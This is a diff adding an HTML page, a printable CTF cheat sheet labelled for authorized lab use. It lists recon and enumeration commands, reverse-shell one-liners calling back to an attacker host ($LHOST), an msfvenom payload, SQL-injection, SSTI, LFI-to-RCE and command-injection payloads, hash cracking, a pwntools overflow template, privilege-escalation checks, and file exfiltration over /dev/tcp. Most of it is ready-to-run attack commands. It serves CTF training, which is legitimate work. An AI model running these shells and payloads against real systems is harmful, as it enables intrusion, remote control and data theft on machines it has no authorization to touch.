@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CTF Quick Cheatsheet</title>
+<style>
+  :root { --accent:#0a7d3c; --bg:#fff; --code:#f4f4f4; --border:#ddd; --muted:#666; }
+  * { box-sizing: border-box; }
+  body { font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+         margin:0; padding:24px; color:#1a1a1a; background:var(--bg); line-height:1.45; font-size:13px; }
+  header { border-bottom:3px solid var(--accent); margin-bottom:16px; padding-bottom:8px; }
+  h1 { margin:0; color:var(--accent); font-size:24px; }
+  .sub { color:var(--muted); font-size:12px; margin-top:4px; }
+  .grid { column-count:2; column-gap:18px; }
+  @media (max-width:800px){ .grid{ column-count:1; } }
+  .card { break-inside:avoid; border:1px solid var(--border); border-radius:6px;
+          padding:10px 12px; margin-bottom:14px; background:#fff; }
+  .card h2 { margin:0 0 8px; font-size:14px; color:var(--accent);
+             border-bottom:1px solid var(--border); padding-bottom:4px; }
+  .card h3 { margin:10px 0 4px; font-size:12px; color:#333; }
+  code, pre { font-family:"Cascadia Code","Consolas",Menlo,monospace; font-size:11px; }
+  pre { background:var(--code); border-radius:4px; padding:7px 9px; margin:5px 0;
+        white-space:pre-wrap; word-break:break-word; border:1px solid #e6e6e6; }
+  code.inline { background:var(--code); padding:1px 4px; border-radius:3px; }
+  .tag { display:inline-block; background:var(--accent); color:#fff; font-size:9px;
+         padding:1px 6px; border-radius:10px; vertical-align:middle; margin-left:6px; }
+  table { width:100%; border-collapse:collapse; font-size:11px; margin:4px 0; }
+  td,th { border:1px solid var(--border); padding:3px 6px; text-align:left; }
+  th { background:#f0f7f2; }
+  .note { font-size:10px; color:var(--muted); }
+  .warn { background:#fff6e5; border:1px solid #f0c36d; padding:6px 9px; border-radius:4px;
+          font-size:11px; margin-bottom:14px; }
+  @media print {
+    body { padding:0; font-size:10.5px; }
+    .card { box-shadow:none; }
+    .noprint { display:none; }
+    pre { font-size:9.5px; }
+  }
+  .printbtn { position:fixed; top:14px; right:14px; background:var(--accent); color:#fff;
+              border:none; padding:9px 16px; border-radius:6px; cursor:pointer; font-size:13px; }
+</style>
+</head>
+<body>
+<button class="printbtn noprint" onclick="window.print()">🖨️ Print / Save as PDF</button>
+
+<header>
+  <h1>🚩 CTF Quick Cheatsheet</h1>
+  <div class="sub">Fast reference for authorized CTF / lab use only. Placeholders: <code class="inline">$IP</code> target, <code class="inline">$LHOST</code>/<code class="inline">$LPORT</code> your listener. &nbsp;|&nbsp; Full detail lives in <code class="inline">cheatsheets/</code>.</div>
+</header>
+
+<div class="warn noprint">💡 To make the PDF: click <b>Print / Save as PDF</b> (top-right) or press <b>Ctrl+P</b> → Destination = <b>Save as PDF</b>. Set margins to "Default" and enable "Background graphics".</div>
+
+<div class="grid">
+
+  <div class="card">
+    <h2>🔍 Recon &amp; Scanning</h2>
+    <pre>nmap -sC -sV -oN nmap.txt $IP      # default scripts + versions
+nmap -p- --min-rate 5000 $IP      # all TCP ports fast
+nmap -sU --top-ports 50 $IP       # top UDP
+rustscan -a $IP -- -sCV           # fast port discovery</pre>
+    <h3>Web directory / vhost</h3>
+    <pre>ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+gobuster dir -u http://$IP -w wl.txt -x php,txt,html
+ffuf -u http://$IP -H "Host: FUZZ.target" -w subs.txt -fs 0   # vhost</pre>
+    <h3>Service enum</h3>
+    <pre>enum4linux -a $IP                 # SMB
+smbclient -L //$IP/ -N            # list shares (null)
+showmount -e $IP                  # NFS exports
+whatweb http://$IP                # web fingerprint</pre>
+  </div>
+
+  <div class="card">
+    <h2>🐚 Reverse Shells <span class="tag">listener first</span></h2>
+    <pre>nc -lvnp $LPORT                   # or: rlwrap nc -lvnp $LPORT</pre>
+    <pre>bash -i >&amp; /dev/tcp/$LHOST/$LPORT 0>&amp;1
+sh -i >&amp; /dev/tcp/$LHOST/$LPORT 0>&amp;1
+nc $LHOST $LPORT -e /bin/sh
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'</pre>
+    <h3>Stabilize the TTY</h3>
+    <pre>python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl+Z, then on your box:
+stty raw -echo; fg
+# back in shell:
+export TERM=xterm; stty rows 50 cols 200</pre>
+    <p class="note">msfvenom: <code class="inline">msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o s.elf</code></p>
+  </div>
+
+  <div class="card">
+    <h2>💉 Web Payloads</h2>
+    <h3>SQLi auth bypass</h3>
+    <pre>' OR '1'='1'-- -
+admin'-- -
+' UNION SELECT NULL,version()-- -</pre>
+    <pre>sqlmap -u "http://$IP/?id=1" --batch --dbs
+sqlmap -r req.txt --batch --dump</pre>
+    <h3>SSTI (test <code class="inline">{{7*7}}</code>)</h3>
+    <pre>Jinja2: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+Twig:   {{['id']|filter('system')}}</pre>
+    <h3>LFI → RCE</h3>
+    <pre>../../../../etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+</pre>
+    <h3>Command injection</h3>
+    <pre>; id    | id    `id`    $(id)    %0aid</pre>
+  </div>
+
+  <div class="card">
+    <h2>🔓 Password Cracking</h2>
+    <table>
+      <tr><th>Hash</th><th>hashcat -m</th><th>john --format</th></tr>
+      <tr><td>MD5</td><td>0</td><td>raw-md5</td></tr>
+      <tr><td>SHA-256</td><td>1400</td><td>raw-sha256</td></tr>
+      <tr><td>bcrypt</td><td>3200</td><td>bcrypt</td></tr>
+      <tr><td>NTLM</td><td>1000</td><td>nt</td></tr>
+      <tr><td>WPA</td><td>22000</td><td>—</td></tr>
+    </table>
+    <pre>hashcat -m 0 hash.txt rockyou.txt
+john --wordlist=rockyou.txt hash.txt
+john --show hash.txt
+hashid '$2y$...'      # identify hash type</pre>
+    <p class="note">rockyou: <code class="inline">/usr/share/wordlists/rockyou.txt</code> (gunzip first)</p>
+  </div>
+
+  <div class="card">
+    <h2>🧩 Reverse Eng / Pwn</h2>
+    <pre>file ./bin ; strings -n 8 ./bin ; checksec ./bin
+objdump -d -M intel ./bin | less
+ltrace ./bin ; strace ./bin
+r2 -AA ./bin   # then: afl, pdf @main, iz</pre>
+    <h3>pwntools offset</h3>
+    <pre>cyclic 200            # pattern
+cyclic -l 0x6161...   # find offset
+from pwn import *
+p = process('./bin')  # or remote('host',port)
+p.sendline(b'A'*offset + p64(addr))
+p.interactive()</pre>
+  </div>
+
+  <div class="card">
+    <h2>🔐 Crypto</h2>
+    <pre># RSA basics (need n,e,c)
+# small e: m = iroot(c, e)
+# have p,q: d = inverse(e,(p-1)*(q-1)); m = pow(c,d,n)
+factordb.com   # look up n
+RsaCtfTool -n N -e E --uncipher C</pre>
+    <h3>XOR / encoding</h3>
+    <pre>echo -n txt | base64 ; base64 -d &lt;&lt;&lt; "..."
+xxd -r -p &lt;&lt;&lt; hexstring
+CyberChef → Magic / From Base64 / XOR Brute Force</pre>
+  </div>
+
+  <div class="card">
+    <h2>🖼️ Forensics &amp; Stego</h2>
+    <pre>binwalk -e file              # extract embedded
+foremost -i file -o out      # carve files
+exiftool image.jpg           # metadata
+steghide extract -sf img.jpg # needs passphrase
+zsteg image.png              # PNG/BMP LSB
+strings -n 6 file | grep -i flag</pre>
+    <h3>Memory (Volatility 3)</h3>
+    <pre>vol -f mem.raw windows.info
+vol -f mem.raw windows.pslist
+vol -f mem.raw windows.cmdline</pre>
+    <h3>PCAP</h3>
+    <pre>tshark -r f.pcap -Y "http.request"
+# Wireshark: Follow → TCP Stream; File → Export Objects → HTTP</pre>
+  </div>
+
+  <div class="card">
+    <h2>⬆️ Privilege Escalation</h2>
+    <h3>Linux</h3>
+    <pre>sudo -l                          # check GTFOBins!
+find / -perm -4000 2>/dev/null   # SUID
+getcap -r / 2>/dev/null          # capabilities
+./linpeas.sh | tee linpeas.txt</pre>
+    <h3>Windows</h3>
+    <pre>whoami /priv                     # SeImpersonate → Potato
+.\winPEASx64.exe
+# unquoted service paths, AlwaysInstallElevated,
+# cmdkey /list, stored creds</pre>
+    <p class="note">Refs: GTFOBins, LOLBAS, HackTricks</p>
+  </div>
+
+  <div class="card">
+    <h2>📡 File Transfer</h2>
+    <pre># Attacker serves:
+python3 -m http.server 80
+# Victim pulls:
+wget http://$LHOST/file ; curl -O http://$LHOST/file
+# No tools? /dev/tcp:
+cat file > /dev/tcp/$LHOST/$LPORT   # nc -lvnp on attacker
+# Base64 paste:
+base64 -w0 file   # copy → base64 -d > file</pre>
+  </div>
+
+  <div class="card">
+    <h2>🧰 SSH Tunneling</h2>
+    <pre>ssh -L 8080:127.0.0.1:80 user@$IP    # local fwd
+ssh -R 9001:127.0.0.1:9001 user@$IP  # remote fwd
+ssh -D 1080 user@$IP                 # SOCKS proxy
+ssh -J jump@host user@target         # ProxyJump
+# then proxychains &lt;cmd&gt;  (edit /etc/proxychains4.conf)</pre>
+  </div>
+
+  <div class="card">
+    <h2>🎯 First-5-Minutes Checklist</h2>
+    <table>
+      <tr><th>Category</th><th>First move</th></tr>
+      <tr><td>Web</td><td>view-source, robots.txt, dirb/ffuf, whatweb</td></tr>
+      <tr><td>Crypto</td><td>identify encoding/hash → CyberChef Magic</td></tr>
+      <tr><td>RE</td><td><code class="inline">file</code>, <code class="inline">strings | grep flag</code>, decompile</td></tr>
+      <tr><td>Pwn</td><td><code class="inline">checksec</code>, find input, cyclic offset</td></tr>
+      <tr><td>Forensics</td><td><code class="inline">binwalk</code>, <code class="inline">exiftool</code>, <code class="inline">strings</code></td></tr>
+      <tr><td>Stego</td><td>strings, binwalk, zsteg/steghide</td></tr>
+      <tr><td>OSINT</td><td>reverse image, crt.sh, Wayback, Google dorks</td></tr>
+    </table>
+    <p class="note">Flag formats: <code class="inline">flag{}</code>, <code class="inline">picoCTF{}</code>, <code class="inline">CTF{}</code>, <code class="inline">HTB{}</code> — grep for the brace!</p>
+  </div>
+
+</div>
+
+<p class="note" style="text-align:center;margin-top:18px;">For authorized CTF / educational use only. Full references in the <code class="inline">cheatsheets/</code> folder.</p>
+</body>
+</html>
